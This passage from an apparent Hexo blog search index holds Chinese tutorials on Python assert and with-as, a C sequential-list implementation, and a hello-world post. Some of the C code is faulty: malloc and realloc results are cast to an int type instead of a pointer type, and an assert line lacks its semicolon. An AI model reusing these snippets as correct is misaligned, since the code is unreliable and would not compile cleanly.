True，程序运行，否则，程序停止运行，抛出 AssertionError 错误。<br>实例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def overage18(age):</span><br><span class="line">    assert age &gt;= 18, &quot;对不起未满18岁，无法进行游戏&quot;</span><br><span class="line">    print(&quot;享受欢乐游戏时光&quot;)</span><br><span class="line"></span><br><span class="line">overage18(15)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AssertionError: 对不起未满18岁，无法进行游戏</span><br></pre></td></tr></table></figure><p>断言主要为调试辅助而生，为的是程序自检，并不是为了处理错误，程序 BUG 还是要依赖 try… except 解决。</p><h3 id="2-常用断言函数"><a href="#2-常用断言函数" class="headerlink" title="(2).常用断言函数"></a>(2).常用断言函数</h3><p>assertEqual(a,b,msg&#x3D;msg)：判断两个值是否相等；<br><br><br>assertNotEqual(a,b,msg&#x3D;msg)：上一函数的反义；<br><br><br>self.assertTrue(a,msg&#x3D;none)：判断变量是否为 True；<br><br><br>assertFalse(a,msg&#x3D;none)：同上反义；<br><br><br>assertIsNone(obj&#x3D;‘’)：判断 obj 是否为空；<br><br><br>assertIsNotNone(obj&#x3D;‘’)：同上反义；</p><h2 id="4-with-as"><a href="#4-with-as" class="headerlink" title="4.with-as"></a>4.with-as</h2><h3 id="1-Python-with…as…是什么"><a href="#1-Python-with…as…是什么" class="headerlink" title="(1).Python with…as…是什么"></a>(1).Python with…as…是什么</h3><p>在 Python 中，文件操作，数据库操作，都需要在程序执行完毕进行清理工作，很多时候我们经常忘记手动关闭，因此 Python 集成了一种自动操作，例如文件使用自后，自动释放资源。<br><br><br>上述场景的描述，转换成 Python 语法就是 with…as 语句，即上下文管理器，它在 Python 中实现了自动分配并释放资源。</p><h3 id="2-with-as-语句的语法格式"><a href="#2-with-as-语句的语法格式" class="headerlink" title="(2).with-as 语句的语法格式"></a>(2).with-as 语句的语法格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with 表达式 [as 指定一个变量名]:</span><br><span class="line">代码块</span><br><span class="line">代码块</span><br></pre></td></tr></table></figure><p>其中 [ ] 中的内容可以省略，如果使用表示将前文表达式的结果保存到一个变量中。</p><h3 id="3-with-as如何使用"><a href="#3-with-as如何使用" class="headerlink" title="(3).with-as如何使用"></a>(3).with-as如何使用</h3><p>用于文件操作<br><br><br>with…as… 语句初次接触一般是在文件操作中，如果不使用上下文管理器，对一个文件进行操作的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = open(&quot;./demo.txt&quot;) # 手动打开</span><br><span class="line">data = file.read()</span><br><span class="line">file.close() # 手动关闭</span><br></pre></td></tr></table></figure><p>下面是 with…as… 版本的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;./demo.txt&quot;) as file:</span><br><span class="line">    data = file.read() </span><br></pre></td></tr></table></figure><p>如果不使用上述语句，想要完成一个完善的代码段，需要使用 try…except… 语句进行操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">file = open(&quot;./demo.txt&quot;)</span><br><span class="line">try:</span><br><span class="line">    data = file.read()</span><br><span class="line">finally:</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>顺序表</title>
      <link href="/2023/03/24/%E9%A1%BA%E5%BA%8F%E8%A1%A8/"/>
      <url>/2023/03/24/%E9%A1%BA%E5%BA%8F%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="title-顺序表Author-isyang-date-2023-x2F-3-x2F-24-23-59-05"><a href="#title-顺序表Author-isyang-date-2023-x2F-3-x2F-24-23-59-05" class="headerlink" title="title: 顺序表Author: isyang_date: 2023&#x2F;3&#x2F;24 23:59:05"></a>title: 顺序表<br>Author: isyang_<br>date: 2023&#x2F;3&#x2F;24 23:59:05</h2><h1 id="顺序表（数据从第一个位置开始放，且连续存储）"><a href="#顺序表（数据从第一个位置开始放，且连续存储）" class="headerlink" title="顺序表（数据从第一个位置开始放，且连续存储）"></a>顺序表（数据从第一个位置开始放，且连续存储）</h1><h2 id="一-接口实现"><a href="#一-接口实现" class="headerlink" title="一. 接口实现"></a>一. 接口实现</h2><h3 id="头文件（-h）写定义-源文件（-c）-写具体实现"><a href="#头文件（-h）写定义-源文件（-c）-写具体实现" class="headerlink" title="头文件（.h）写定义   源文件（.c） 写具体实现"></a>头文件（.h）写定义   源文件（.c） 写具体实现</h3><h2 id="二-顺序表的结构"><a href="#二-顺序表的结构" class="headerlink" title="二. 顺序表的结构"></a>二. 顺序表的结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef int SLDataType; //这里使用别名是为了方便修改数据表储存数据的类型</span><br><span class="line"></span><br><span class="line">typedef struct SeqList</span><br><span class="line">&#123;</span><br><span class="line">SLDataType *a;//指向动态开辟的数组</span><br><span class="line">int size;     //目前有效存储数据个数</span><br><span class="line">int capacity; //开辟空间总容量</span><br><span class="line">&#125;SL;</span><br></pre></td></tr></table></figure><h2 id="三-顺序表各种接口函数实现（初始化-增容-销毁-打印-增-删-改-查-）"><a href="#三-顺序表各种接口函数实现（初始化-增容-销毁-打印-增-删-改-查-）" class="headerlink" title="三.顺序表各种接口函数实现（初始化 增容 销毁 打印 增 删 改 查 ）"></a>三.顺序表各种接口函数实现（初始化 增容 销毁 打印 增 删 改 查 ）</h2><h3 id="1-顺序表的初始化"><a href="#1-顺序表的初始化" class="headerlink" title="1.顺序表的初始化"></a>1.顺序表的初始化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void SeqListInit (SL *ps)&#123;</span><br><span class="line">ps-&gt;a = NULL;//开辟内存之前给指针赋值为空，可以避免野指针出现（野指针是指指向未知地址或未分配内存空间的指针，如果程序试图访问该地址，就会导致程序崩溃或出现不可预知的后果）//</span><br><span class="line">  ps-&gt;a = (SLDataType)malloc(sizeof(SLDataType)* 4);//初始开辟四个空间，不够再扩容;</span><br><span class="line">if(ps-&gt;a == NULL)  //开辟失败</span><br><span class="line">&#123; </span><br><span class="line">  printf(&quot;申请内存失败&quot;);</span><br><span class="line">  exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">ps-&gt;size = 0;</span><br><span class="line">ps-&gt;capacity = 4;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-顺序表的增容（检查容量，不够则增容）"><a href="#2-顺序表的增容（检查容量，不够则增容）" class="headerlink" title="2.顺序表的增容（检查容量，不够则增容）"></a>2.顺序表的增容（检查容量，不够则增容）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void SLCheckCapacity (SL *ps)&#123;</span><br><span class="line">if (ps-&gt;size &gt;= ps-&gt;capacity)</span><br><span class="line">&#123;</span><br><span class="line">ps-&gt;capacity *= 2;</span><br><span class="line">ps-&gt;a = (SLDataType)realloc(ps-&gt;a, sizeof(SLDataType)*ps-&gt;capacity);</span><br><span class="line">if (ps-&gt;a == NULL)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;增容失败\n&quot;);</span><br><span class="line">exit(-1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-顺序表的销毁"><a href="#3-顺序表的销毁" class="headerlink" title="3.顺序表的销毁"></a>3.顺序表的销毁</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void SeqListDestory(SL *ps)&#123;</span><br><span class="line">assert(ps != NULL)                    //判断是否为空</span><br><span class="line">free(ps-&gt;a);                          //先释放指针a指向的空间</span><br><span class="line">ps-&gt;a = NULL;                         //再将指针a赋空</span><br><span class="line">ps-&gt;capacity = 0;</span><br><span class="line">ps-&gt;size = 0;                         //最后将容量和数据个数赋0</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-顺序表的打印"><a href="#4-顺序表的打印" class="headerlink" title="4.顺序表的打印"></a>4.顺序表的打印</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void SeqListPrint (SL *ps)&#123;</span><br><span class="line">int i = 0;</span><br><span class="line">for (; i &lt; ps-&gt;size; i++)             //size控制打印次数</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;, ps-&gt;a[i]);          //根据具体类型改输出格式</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-顺序表的头插"><a href="#5-顺序表的头插" class="headerlink" title="5.顺序表的头插"></a>5.顺序表的头插</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void SeqListPushFront (SL *ps,SLDataType x)&#123;</span><br><span class="line">SLCheckCapacity(ps);                 //检查容量，不足则增容</span><br><span class="line">int end = ps-&gt;size;                  //控制挪动数据</span><br><span class="line">for(; end &gt; 0; end--)&#123;</span><br><span class="line">ps-&gt;a[end] = ps-&gt;a[end-1];</span><br><span class="line">&#125;</span><br><span class="line">ps-&gt;a[0] = x;</span><br><span class="line">ps-&gt;size++;                          //插入后size记得加1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="6-顺序表的尾插"><a href="#6-顺序表的尾插" class="headerlink" title="6.顺序表的尾插"></a>6.顺序表的尾插</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void SeqListPushBack (SL *ps,SLDataType x)&#123;</span><br><span class="line">SLCheckCapacity(ps);</span><br><span class="line">ps-&gt;a[ps-&gt;size] = x;</span><br><span class="line">ps-&gt;size++;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="7-顺序表的任意位置（pos位置）插入"><a href="#7-顺序表的任意位置（pos位置）插入" class="headerlink" title="7.顺序表的任意位置（pos位置）插入"></a>7.顺序表的任意位置（pos位置）插入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void SeqListInsert (SL *ps, int pos, SLDataType x)&#123;</span><br><span class="line">assert(pos &gt;= 0 &amp;&amp; pos &lt;= ps-&gt;size); //判断pos的合法性</span><br><span class="line">SLCheckCapacity(ps);                 //检查容量，不足则增容</span><br><span class="line">int end = ps-&gt;size - 1;</span><br><span class="line">while(end &gt;= pos)</span><br><span class="line">&#123; </span><br><span class="line">ps-&gt;a[end+1] = ps-&gt;a[end];</span><br><span class="line">end--;</span><br><span class="line">&#125;</span><br><span class="line">ps-&gt;a[pos] = x;</span><br><span class="line">ps-&gt;size++;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="8-顺序表的头删"><a href="#8-顺序表的头删" class="headerlink" title="8.顺序表的头删"></a>8.顺序表的头删</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void SeqListPopFront (SL *ps)&#123;</span><br><span class="line">assert(ps-&gt;size &gt; 0);               //保证有数据可删</span><br><span class="line">int begin = 1;</span><br><span class="line">while (begin &lt; ps-&gt;size)            //begin小于size时挪动数据</span><br><span class="line">&#123;</span><br><span class="line">ps-&gt;a[begin - 1] = ps-&gt;a[begin];</span><br><span class="line">begin++;</span><br><span class="line">&#125;</span><br><span class="line">ps-&gt;size--;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="9-顺序表的尾删"><a href="#9-顺序表的尾删" class="headerlink" title="9.顺序表的尾删"></a>9.顺序表的尾删</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void SeqListPopBack (SL *ps)&#123;</span><br><span class="line">assert(ps-&gt;size &gt; 0);               //保证有数据可删</span><br><span class="line">ps-&gt;size--;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="10-顺序表的任意位置（pos位置）删除"><a href="#10-顺序表的任意位置（pos位置）删除" class="headerlink" title="10.顺序表的任意位置（pos位置）删除"></a>10.顺序表的任意位置（pos位置）删除</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void SeqListErase (SL *ps, int pos)&#123;</span><br><span class="line">assert(pos &gt;= 0 &amp;&amp; pos &lt; ps-&gt;size);//保证pos的合法性</span><br><span class="line">int begin = pos + 1;</span><br><span class="line">while(begin &lt; ps-&gt;size)</span><br><span class="line">&#123;</span><br><span class="line"> ps-&gt;a[begin-1] = ps-&gt;a[begin];</span><br><span class="line"> begin++;</span><br><span class="line">&#125;</span><br><span class="line"> ps-&gt;size--;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="11-顺序表的元素查找"><a href="#11-顺序表的元素查找" class="headerlink" title="11.顺序表的元素查找"></a>11.顺序表的元素查找</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int SeqListFind(SL *ps, SLDataType x)&#123;</span><br><span class="line">  for (int i = 0; i &lt; ps-&gt;size; i++)&#123; //遍历顺序表</span><br><span class="line">if (ps-&gt;a[i] == x)&#123;           //找到数据返回下标</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return -1;                       //找不到返回-1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="12-顺序表修改任意位置（pos位置）的数据"><a href="#12-顺序表修改任意位置（pos位置）的数据" class="headerlink" title="12.顺序表修改任意位置（pos位置）的数据"></a>12.顺序表修改任意位置（pos位置）的数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void SeqListAlter(SL *ps, int pos, SLDataType x)&#123;</span><br><span class="line">    assert(pos &gt;=0 &amp;&amp; pos &lt; ps-&gt;size);</span><br><span class="line">    ps-&gt;a[pos] = x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="四-顺序表知识小结"><a href="#四-顺序表知识小结" class="headerlink" title="四.顺序表知识小结"></a>四.顺序表知识小结</h2><h3 id="1-写代码时的注意点"><a href="#1-写代码时的注意点" class="headerlink" title="(1)写代码时的注意点"></a>(1)写代码时的注意点</h3><ol><li>插入数据之前需要确保是否容量足够，插入完size+1  <br></li><li>删除数据之前需要确保是否有数据可删，删除完size-1  <br></li><li>在任意位置插入或者删除时要判断该位置是否合理  <br></li><li>空间开辟先给指针赋空，再用分配内存函数开辟空间  <br></li><li>为了方便检查报错，用到哪个指针，就用assert函数去判断该指针是否为空</li></ol><h3 id="2-顺序表的优点和缺点"><a href="#2-顺序表的优点和缺点" class="headerlink" title="(2)顺序表的优点和缺点"></a>(2)顺序表的优点和缺点</h3><ol><li>顺序表的优点：<br>顺序表可以通过索引（下标）快速地存、取表中元素。</li><li>顺序表的缺点:<br>① 顺序表的插入和删除操作，会使得表中的大量元素进行移动，效率较低。<br>② 顺序表在面对扩容问题的时候，比较繁琐。当顺序表放满的时候，我们需要进行扩容。而扩容的大小需要面对不同的情况，若扩容的容量较大，那么会使得空间利用率较低；若扩容的容量较小，在后续的代码执行过程中，又需要不断地扩容操作，这使得代码变得更加繁琐。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/2023/03/21/helloworld/"/>
      <url>/2023/03/21/helloworld/</url>
      
        <content type="html"><![CDATA[<h1 id="hello-world！"><a href="#hello-world！" class="headerlink" title="hello world！"></a>hello world！</h1><h2 id="Welcome-to-isyang-’s-blog"><a href="#Welcome-to-isyang-’s-blog" class="headerlink" title="Welcome to isyang_’s blog !"></a>Welcome to isyang_’s blog !</h2><p><img src="/img/touxiang.jpg" alt="title"></p>]]></content>
      
      
      
        <tags>
            
            <tag> hello </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
